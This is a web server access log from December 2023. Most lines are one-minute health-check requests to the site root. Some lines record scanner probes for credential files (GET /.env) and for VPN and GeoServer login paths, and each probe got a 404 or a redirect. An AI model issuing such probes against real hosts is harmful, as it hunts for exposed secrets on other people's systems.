159.203.109.206 - - [19/Dec/2023:09:38:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9042 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:09:38:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9043 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:09:39:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9044 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:09:39:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9045 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:09:40:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9046 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:09:40:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9047 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:09:41:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9048 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [19/Dec/2023:09:41:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9049 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:09:42:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9050 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:09:42:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9051 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:09:43:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9052 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:09:43:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9053 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:09:44:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9054 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:09:44:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9055 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:09:45:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9056 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:09:45:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9057 "www@docker" "http://172.18.0.9:80" 1ms
185.180.140.4 - - [19/Dec/2023:09:45:59 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 9058 "web-to-websecure@internal" "-" 0ms
185.180.140.4 - - [19/Dec/2023:09:45:59 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 9059 "-" "-" 0ms
159.203.109.206 - - [19/Dec/2023:09:46:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9060 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:09:46:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9061 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:09:47:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9062 "www@docker" "http://172.18.0.9:80" 0ms
69.164.217.74 - - [19/Dec/2023:09:47:23 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 9063 "-" "-" 0ms
167.71.120.76 - - [19/Dec/2023:09:47:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9064 "www@docker" "http://172.18.0.9:80" 0ms
45.79.181.223 - - [19/Dec/2023:09:48:15 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 9065 "-" "-" 0ms
159.203.109.206 - - [19/Dec/2023:09:48:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9066 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:09:48:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9067 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:09:49:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9068 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:09:49:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9069 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:09:50:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9070 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:09:50:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9071 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:09:51:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9072 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:09:51:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9073 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:09:52:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9074 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:09:52:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9075 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:09:53:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9076 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:09:53:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9077 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:09:54:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9078 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:09:54:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9079 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:09:55:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9080 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [19/Dec/2023:09:55:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9081 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:09:56:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9082 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:09:56:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9083 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:09:57:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9084 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:09:57:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9085 "www@docker" "http://172.18.0.9:80" 0ms
66.240.236.116 - - [19/Dec/2023:09:58:06 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 9086 "-" "-" 0ms
159.203.109.206 - - [19/Dec/2023:09:58:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9087 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [19/Dec/2023:09:58:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9088 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:09:59:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9089 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:09:59:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9090 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:10:00:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9091 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:10:00:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9092 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:10:01:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9093 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:10:01:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9094 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:10:02:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9095 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:10:02:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9096 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:10:03:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9097 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [19/Dec/2023:10:03:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9098 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:10:04:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9099 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [19/Dec/2023:10:04:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9100 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:10:05:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9101 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:10:05:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9102 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:10:06:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9103 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:10:06:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9104 "www@docker" "http://172.18.0.9:80" 1ms
64.62.197.46 - - [19/Dec/2023:10:07:19 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 9105 "-" "-" 0ms
159.203.109.206 - - [19/Dec/2023:10:07:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9106 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [19/Dec/2023:10:07:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9107 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:10:08:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9108 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:10:08:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9109 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:10:09:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9110 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [19/Dec/2023:10:09:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9111 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:10:10:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9112 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [19/Dec/2023:10:10:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9113 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:10:11:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9114 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [19/Dec/2023:10:11:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9115 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:10:12:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9116 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:10:12:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9117 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:10:13:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9118 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:10:13:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9119 "www@docker" "http://172.18.0.9:80" 0ms
64.62.197.43 - - [19/Dec/2023:10:13:48 +0000] "GET /favicon.ico HTTP/1.1" 404 19 "-" "-" 9120 "-" "-" 0ms
159.203.109.206 - - [19/Dec/2023:10:14:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9121 "www@docker" "http://172.18.0.9:80" 0ms
64.62.197.42 - - [19/Dec/2023:10:14:33 +0000] "GET /dns-query?name=dnsscan.shadowserver.org&type=A HTTP/1.1" 404 19 "-" "-" 9122 "-" "-" 0ms
167.71.120.76 - - [19/Dec/2023:10:14:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9123 "www@docker" "http://172.18.0.9:80" 0ms
64.62.197.45 - - [19/Dec/2023:10:14:51 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 9124 "-" "-" 0ms
159.203.109.206 - - [19/Dec/2023:10:15:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9125 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:10:15:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9126 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:10:16:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9127 "www@docker" "http://172.18.0.9:80" 0ms
64.62.197.44 - - [19/Dec/2023:10:16:31 +0000] "GET /api/v2/static/not.found HTTP/1.1" 404 19 "-" "-" 9128 "-" "-" 0ms
167.71.120.76 - - [19/Dec/2023:10:16:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9129 "www@docker" "http://172.18.0.9:80" 1ms
64.62.197.40 - - [19/Dec/2023:10:16:47 +0000] "GET /remote/logincheck HTTP/1.1" 404 19 "-" "-" 9130 "-" "-" 0ms
159.203.109.206 - - [19/Dec/2023:10:17:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9131 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:10:17:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9132 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:10:18:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9133 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:10:18:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9134 "www@docker" "http://172.18.0.9:80" 0ms
64.62.197.44 - - [19/Dec/2023:10:19:10 +0000] "GET /geoserver/web/ HTTP/1.1" 404 19 "-" "-" 9135 "-" "-" 0ms
159.203.109.206 - - [19/Dec/2023:10:19:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9136 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:10:19:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9137 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:10:20:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9138 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [19/Dec/2023:10:20:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9139 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:10:21:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9140 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:10:21:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9141 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:10:22:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9142 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:10:22:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9143 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:10:23:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9144 "www@docker" "http://172.18.0.9:80" 1ms
78.153.140.219 - - [19/Dec/2023:10:23:26 +0000] "GET /.env HTTP/1.1" 404 19 "-" "-" 9145 "-" "-" 0ms
78.153.140.219 - - [19/Dec/2023:10:23:26 +0000] "GET /.env HTTP/1.1" 404 19 "-" "-" 9146 "-" "-" 0ms
167.71.120.76 - - [19/Dec/2023:10:23:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9147 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:10:24:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9148 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:10:24:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9149 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:10:25:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9150 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:10:25:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9151 "www@docker" "http://172.18.0.9:80" 1ms
143.110.222.166 - - [19/Dec/2023:10:25:36 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 9152 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [19/Dec/2023:10:26:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9153 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:10:26:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9154 "www@docker" "http://172.18.0.9:80" 1ms
143.110.222.166 - - [19/Dec/2023:10:27:01 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 9155 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [19/Dec/2023:10:27:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9156 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:10:27:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9157 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:10:28:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9158 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:10:28:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9159 "www@docker" "http://172.18.0.9:80" 1ms
34.78.6.216 - - [19/Dec/2023:10:29:15 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 9160 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [19/Dec/2023:10:29:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9161 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:10:29:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9162 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:10:30:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9163 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:10:30:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9164 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:10:31:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9165 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [19/Dec/2023:10:31:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9166 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:10:32:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9167 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:10:32:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9168 "www@docker" "http://172.18.0.9:80" 0ms
45.79.163.53 - - [19/Dec/2023:10:33:06 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 9169 "-" "-" 0ms
159.203.109.206 - - [19/Dec/2023:10:33:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9170 "www@docker" "http://172.18.0.9:80" 0ms
172.104.11.46 - - [19/Dec/2023:10:33:31 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 9171 "-" "-" 0ms
167.71.120.76 - - [19/Dec/2023:10:33:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9172 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:10:34:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9173 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:10:34:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9174 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:10:35:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9175 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:10:35:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9176 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:10:36:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9177 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [19/Dec/2023:10:36:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9178 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:10:37:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9179 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:10:37:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9180 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:10:38:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9181 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:10:38:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9182 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:10:39:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9183 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:10:39:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9184 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:10:40:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9185 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:10:40:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9186 "www@docker" "http://172.18.0.9:80" 1ms
185.73.124.213 - - [19/Dec/2023:10:40:59 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 9187 "-" "-" 0ms
159.203.109.206 - - [19/Dec/2023:10:41:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9188 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:10:41:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9189 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:10:42:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9190 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:10:42:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9191 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:10:43:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9192 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:10:43:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9193 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:10:44:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9194 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:10:44:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9195 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:10:45:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9196 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:10:45:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9197 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:10:46:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9198 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [19/Dec/2023:10:46:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9199 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:10:47:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9200 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:10:47:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9201 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:10:48:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9202 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:10:48:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9203 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:10:49:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9204 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [19/Dec/2023:10:49:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9205 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:10:50:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9206 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:10:50:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9207 "www@docker" "http://172.18.0.9:80" 0ms
2.56.247.167 - - [19/Dec/2023:10:50:41 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 9208 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [19/Dec/2023:10:51:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9209 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [19/Dec/2023:10:51:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9210 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:10:52:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9211 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:10:52:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9212 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:10:53:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9213 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:10:53:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9214 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:10:54:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9215 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:10:54:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9216 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:10:55:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9217 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:10:55:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9218 "www@docker" "http://172.18.0.9:80" 0ms
64.62.197.50 - - [19/Dec/2023:10:56:06 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 9219 "-" "-" 0ms
159.203.109.206 - - [19/Dec/2023:10:56:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9220 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:10:56:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9221 "www@docker" "http://172.18.0.9:80" 0ms
57.129.23.166 - - [19/Dec/2023:10:56:52 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 9222 "web-to-websecure@internal" "-" 0ms
57.129.23.166 - - [19/Dec/2023:10:56:52 +0000] "POST / HTTP/1.1" 308 18 "-" "-" 9223 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [19/Dec/2023:10:57:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9224 "www@docker" "http://172.18.0.9:80" 0ms
64.62.197.54 - - [19/Dec/2023:10:57:35 +0000] "GET /favicon.ico HTTP/1.1" 404 19 "-" "-" 9225 "-" "-" 0ms
167.71.120.76 - - [19/Dec/2023:10:57:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9226 "www@docker" "http://172.18.0.9:80" 1ms
